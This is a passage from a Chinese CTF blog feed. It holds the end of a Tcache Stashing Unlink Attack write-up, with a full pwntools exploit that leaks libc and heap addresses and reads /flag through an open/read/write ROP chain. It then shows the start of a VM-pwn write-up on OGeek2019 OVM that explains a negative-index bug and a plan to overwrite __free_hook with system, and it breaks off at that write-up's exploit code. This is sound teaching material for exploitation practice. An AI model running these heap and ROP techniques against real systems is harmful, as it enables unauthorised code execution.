src="/2024/12/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8BTcache-Stashing-Unlink-Attack/3419447-20241213193116118-620273184.png" alt="img"></p><p>那么接下来就是正常的rop即可</p><h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gt <span class="hljs-keyword">import</span> *<br>con(<span class="hljs-string">&quot;amd64&quot;</span>)<br><br>io = process(<span class="hljs-string">&quot;./sma&quot;</span>)<br><span class="hljs-comment"># io = remote(&quot;gz.imxbt.cn&quot;,20818)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;size:&quot;</span>,<span class="hljs-built_in">str</span>(size))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Idx:&quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,msg</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Idx:&quot;</span>,<span class="hljs-built_in">str</span>(index))<br>    io.sendafter(<span class="hljs-string">&quot;Content:&quot;</span>,msg)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Idx:&quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backdoor</span>():<br>    io.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">&quot;5&quot;</span>)<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add(<span class="hljs-number">0x280</span>)<br><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#10</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    add(<span class="hljs-number">0xf0</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(i)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    free(<span class="hljs-number">11</span>+i)<br><br>free(<span class="hljs-number">7</span>)<br><br><span class="hljs-comment">#gdb.attach(io)</span><br>show(<span class="hljs-number">7</span>)<br>io.recv(<span class="hljs-number">1</span>)<br>libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1ecbe0</span><br>suc(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br><br>gdb.attach(io)<br>add(<span class="hljs-number">0x180</span>) <span class="hljs-comment">#11</span><br>add(<span class="hljs-number">0x3a0</span>) <span class="hljs-comment">#12</span><br>free(<span class="hljs-number">9</span>)<br>add(<span class="hljs-number">0x180</span>) <span class="hljs-comment">#13</span><br>add(<span class="hljs-number">0x3a0</span>) <span class="hljs-comment">#14</span><br><br>io.recvuntil(<span class="hljs-string">&quot;Add Ptr: &quot;</span>)<br>heap_base = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>) -<span class="hljs-number">0x3260</span> -<span class="hljs-number">0x2d0</span> -<span class="hljs-number">0x230</span><br>suc(<span class="hljs-string">&quot;heap_base&quot;</span>,heap_base)<br>fd = heap_base + <span class="hljs-number">0x27f0</span><br>suc(<span class="hljs-string">&quot;fd&quot;</span>,fd)<br>heap = heap_base+<span class="hljs-number">0x2b90</span><br>suc(<span class="hljs-string">&quot;heap&quot;</span>,heap)<br><span class="hljs-comment"># gdb.attach(io)</span><br>edit(<span class="hljs-number">9</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x180</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x101</span>)+p64(fd)+p64(heap_base+<span class="hljs-number">0x2b90</span>))<br>edit(<span class="hljs-number">9</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x101</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x00000000004040C0</span>-<span class="hljs-number">0x10</span>)+<span class="hljs-string">b&#x27;/flag\x00&#x27;</span>)<br>add(<span class="hljs-number">0xf0</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">&quot;5&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x38</span><br>pop_rax = libc_base + <span class="hljs-number">0x0000000000036174</span><br>pop_rdi = libc_base + <span class="hljs-number">0x0000000000023b6a</span><br>pop_rsi = libc_base + <span class="hljs-number">0x000000000002601f</span><br>pop_rdx_r12 = libc_base + <span class="hljs-number">0x0000000000119431</span><br>syscall = libc_base + <span class="hljs-number">0x00000000000630a9</span><br><br>flag_addr = heap+<span class="hljs-number">0x20</span><br><br><span class="hljs-comment"># gdb.attach(io)</span><br>payload += p64(pop_rax) + p64(<span class="hljs-number">257</span>)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">0xffffff9c</span>)   <br>payload += p64(pop_rsi) + p64(flag_addr)<br>payload += p64(pop_rdx_r12) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(syscall)<br><span class="hljs-comment"># read</span><br>payload += p64(pop_rax) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>)<br>payload += p64(pop_rsi) + p64(flag_addr)<br>payload += p64(pop_rdx_r12) + p64(<span class="hljs-number">0x100</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(syscall)<br><span class="hljs-comment"># write</span><br>payload += p64(pop_rax) + p64(<span class="hljs-number">1</span>)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">1</span>)<br>payload += p64(pop_rsi) + p64(flag_addr)<br>payload += p64(pop_rdx_r12) + p64(<span class="hljs-number">0x100</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(syscall)<br><span class="hljs-comment"># gdb.attach(io)</span><br><br>io.send(payload)<br><span class="hljs-comment"># add(0xe0)</span><br><span class="hljs-comment"># io.recvuntil(&quot;Add Ptr: &quot;)</span><br><span class="hljs-comment"># heap_base = int(io.recv(10),16) -0x2eb0</span><br><span class="hljs-comment"># suc(&quot;heap_base&quot;,heap_base)</span><br><br><span class="hljs-comment"># gdb.attach(io)</span><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Tcache Stashing Unlink Attack在calloc申请堆块的情况下无疑是一种不错的选择，它继承了2.29之后unsortbin attack的特性，同时在一定情况下还可以任意地址申请，是一个不错的攻击方法，因为平常遇到的有点少，但是还是得了解一下攻击方法什么的。</p>]]></content>
    
    
    
    <tags>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vmpwn小总结</title>
    <link href="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/"/>
    <url>/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a><strong>前言：</strong></h2><p>好久没有更新博客了，关于vm的学习也是断断续续的，只见识了几道题目，但是还是想总结一下，所谓vmpwn就是把出栈，进栈，寄存器，bss段等单独申请一块空闲实现相关的功能，也就是说一些汇编命令通过一些函数来实现，而大部分的vmpwn的切入点大多是不安全的下标，通过下标来泄露一些东西或者修改一些东西等等…..</p><p>以下是vmpwn的一些简单的题目，但是有些很复杂的题目需要很强的逆向能力，慢慢的分析</p><h2 id="OGeek2019-Final-OVM"><a href="#OGeek2019-Final-OVM" class="headerlink" title="[OGeek2019 Final]OVM"></a>[OGeek2019 Final]OVM</h2><p>保护策略</p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212221007847-1277360936.png" alt="img"></p><p>ida逆向</p><p>PC 程序计数器，它存放的是一个内存地址，该地址中存放着 下一条 要执行的计算机指令。 SP 指针寄存器，永远指向当前的栈顶。</p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212221338411-416369404.png" alt="img">、</p><p>通过我们输入的代码指令来操作的，也就是接下来的code</p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212221706543-416530255.png" alt="img"></p><p>而紧接着就是对我们输入的code进行处理具体在 execute函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> __fastcall <span class="hljs-title function_">execute</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">ssize_t</span> result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> __int8 v2; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br>  <span class="hljs-type">unsigned</span> __int8 v3; <span class="hljs-comment">// [rsp+19h] [rbp-7h]</span><br>  <span class="hljs-type">unsigned</span> __int8 v4; <span class="hljs-comment">// [rsp+1Ah] [rbp-6h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><span class="hljs-comment">//这里将字节分为4给部分，分别是v4,v3,v2和高位 </span><br>  v4 = (a1 &amp; <span class="hljs-number">0xF0000</span>u) &gt;&gt; <span class="hljs-number">16</span>;<br>  v3 = (<span class="hljs-type">unsigned</span> __int16)(a1 &amp; <span class="hljs-number">0xF00</span>) &gt;&gt; <span class="hljs-number">8</span>;<br>  v2 = a1 &amp; <span class="hljs-number">0xF</span>;<br>  result = HIBYTE(a1); <span class="hljs-comment">//这里取高字节进行匹配</span><br>  <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0x70</span> )<br>  &#123;<br>    result = (<span class="hljs-type">ssize_t</span>)reg;<br>    reg[v4] = reg[v2] + reg[v3];                <span class="hljs-comment">// 加法</span><br>    <span class="hljs-keyword">return</span> result;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( HIBYTE(a1) &gt; <span class="hljs-number">0x70</span>u )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0xB0</span> )<br>    &#123;<br>      result = (<span class="hljs-type">ssize_t</span>)reg;<br>      reg[v4] = reg[v2] ^ reg[v3];              <span class="hljs-comment">// 异或</span><br>      <span class="hljs-keyword">return</span> result;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( HIBYTE(a1) &gt; <span class="hljs-number">0xB0</span>u )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0xD0</span> )<br>      &#123;<br>        result = (<span class="hljs-type">ssize_t</span>)reg;<br>        reg[v4] = (<span class="hljs-type">int</span>)reg[v3] &gt;&gt; reg[v2];      <span class="hljs-comment">// 右移</span><br>        <span class="hljs-keyword">return</span> result;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( HIBYTE(a1) &gt; <span class="hljs-number">0xD0</span>u )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0xE0</span> )<br>        &#123;<br>          running = <span class="hljs-number">0</span>;<br>          <span class="hljs-keyword">if</span> ( !reg[<span class="hljs-number">13</span>] )<br>            <span class="hljs-keyword">return</span> write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;EXIT\n&quot;</span>, <span class="hljs-number">5uLL</span>);    <span class="hljs-comment">// 栈空退出</span><br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( HIBYTE(a1) != <span class="hljs-number">0xFF</span> )<br>        &#123;<br>          <span class="hljs-keyword">return</span> result;<br>        &#125;<br>        running = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">15</span>; ++i )<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;R%d: %X\n&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)i, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)reg[i]);<span class="hljs-comment">// 打印数据</span><br>        <span class="hljs-keyword">return</span> write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;HALT\n&quot;</span>, <span class="hljs-number">5uLL</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0xC0</span> )<br>      &#123;<br>        result = (<span class="hljs-type">ssize_t</span>)reg;<br>        reg[v4] = reg[v3] &lt;&lt; reg[v2];           <span class="hljs-comment">// 左移</span><br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">switch</span> ( HIBYTE(a1) )<br>      &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x90</span>u:<br>          result = (<span class="hljs-type">ssize_t</span>)reg;<br>          reg[v4] = reg[v2] &amp; reg[v3];<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xA0</span>u:<br>          result = (<span class="hljs-type">ssize_t</span>)reg;<br>          reg[v4] = reg[v2] | reg[v3];<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x80</span>u:<br>          result = (<span class="hljs-type">ssize_t</span>)reg;<br>          reg[v4] = reg[v3] - reg[v2];<br>          <span class="hljs-keyword">break</span>;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0x30</span> )<br>  &#123;<br>    result = (<span class="hljs-type">ssize_t</span>)reg;<br>    reg[v4] = memory[reg[v2]];<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( HIBYTE(a1) &gt; <span class="hljs-number">0x30</span>u )<br>  &#123;<br>    <span class="hljs-keyword">switch</span> ( HIBYTE(a1) )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x50</span>u:<br>        LODWORD(result) = reg[<span class="hljs-number">13</span>];<br>        reg[<span class="hljs-number">13</span>] = result + <span class="hljs-number">1</span>;<br>        result = (<span class="hljs-type">int</span>)result;<br>        <span class="hljs-built_in">stack</span>[(<span class="hljs-type">int</span>)result] = reg[v4];<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x60</span>u:<br>        --reg[<span class="hljs-number">13</span>];<br>        result = (<span class="hljs-type">ssize_t</span>)reg;<br>        reg[v4] = <span class="hljs-built_in">stack</span>[reg[<span class="hljs-number">13</span>]];<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x40</span>u:<br>        result = (<span class="hljs-type">ssize_t</span>)memory;<br>        memory[reg[v2]] = reg[v4];<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0x10</span> )<br>  &#123;<br>    result = (<span class="hljs-type">ssize_t</span>)reg;<br>    reg[v4] = (<span class="hljs-type">unsigned</span> __int8)a1;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0x20</span> )<br>  &#123;<br>    result = (<span class="hljs-type">ssize_t</span>)reg;<br>    reg[v4] = (_BYTE)a1 == <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212221949071-1042397994.png" alt="img"></p><p>这里我们输入的pc给了reg[15]，每次循环进行匹配+1，然后进行进行处理也就是刚刚上面的代码逻辑</p><p>这里可以用python来看看到底取了什么（当然因为我代码基础比较弱….）</p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212223127910-1935792498.png" alt="img"></p><p>那么看到取到的其实2，3，4也就是v4,v3,v2。</p><p>然后继续分析</p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212223415143-1050529184.png" alt="img"></p><p>那么这里不难看出就是通过v2,v3来当作下标取reg数组进行索引的</p><p>但是没有对下标进行限制那么就是可以输入负数来造成恶意数据的修改等等</p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212223719357-549222091.png" alt="img"></p><p>0x30和0x40，这里分别是取memory的值给reg，和取reg的值给memory，但是这期间它们的下标我们都可以自己控制</p><p>同时还有这个</p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212224356838-659812714.png" alt="img"></p><p>我们可以向reg里面进行赋值和取出值</p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212224645956-442285452.png" alt="img"></p><p>这里打印reg里面的值，但是是4位一组</p><p>最后会调用free把我们输入东西进行free，那么如果我们把free_hook给修改成system那么就可以通过输入&#x2F;bin&#x2F;sh来获取shell</p><p>那么就需要得到一个libc地址，正好前面可以通过负数下标来将一个libc地址存入reg输入，然后进行打印泄露地址</p><p>这里可以把相关的函数包装一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">v4,v3,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0x70</span>)+p8(v4)+p8(v3)+p8(v2))[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>(<span class="hljs-params">v4,v3,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0xb0</span>)+p8(v4)+p8(v3)+p8(v2))[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rhl</span>(<span class="hljs-params">v4,v3,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0xd0</span>)+p8(v4)+p8(v3)+p8(v2))[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lhl</span>(<span class="hljs-params">v4,v3,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0xc0</span>)+p8(v4)+p8(v3)+p8(v2))[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readn</span>(<span class="hljs-params">v4,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0x30</span>)+p8(v4)+p8(<span class="hljs-number">0</span>)+p8(v2))[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writen</span>(<span class="hljs-params">v4,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0x40</span>)+p8(v4)+p8(<span class="hljs-number">0</span>)+p8(v2))[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setnum</span>(<span class="hljs-params">v4,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0x10</span>)+p8(v4)+p8(<span class="hljs-number">0</span>)+p8(v2))[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><br><span class="hljs-comment">#n=(0x202060-0x201f80)/4 = 56</span><br><span class="hljs-comment">#-56 = 0xffffffc8</span><br><span class="hljs-comment">#-8</span><br><span class="hljs-comment">#stdin -&gt; __free_hook = 0x2398</span><br></code></pre></td></tr></table></figure><p>因为只能4位一组，所以只能分别取到低四位和高四位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">readn(<span class="hljs-number">4</span>,<span class="hljs-number">2</span>), <span class="hljs-comment">#reg[4] = memory[reg[2]] stdin+4</span><br>setnum(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>),<br>lhl(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>), <span class="hljs-comment">#reg[1] = reg[1]&lt;&lt;reg[0] = 0x10 &lt;&lt; 8= 0x1000</span><br></code></pre></td></tr></table></figure><p>这里用的是泄露stdin的libc地址，进而得到free_hook的地址</p><p>因为最后向这里写数据</p><p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212225519456-1239240624.png" alt="img"> </p><p>所以可以把这里存放着free_hook -8 的地址，那么就可以getshell</p><p>那么整体思路就是通过构造负数下标，得到libc地址，然后构造高低位来泄露libc地址，然后根据偏移得到free_hook -8地址，然后继续通过高低位写入comment函数，获取shell</p><h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span 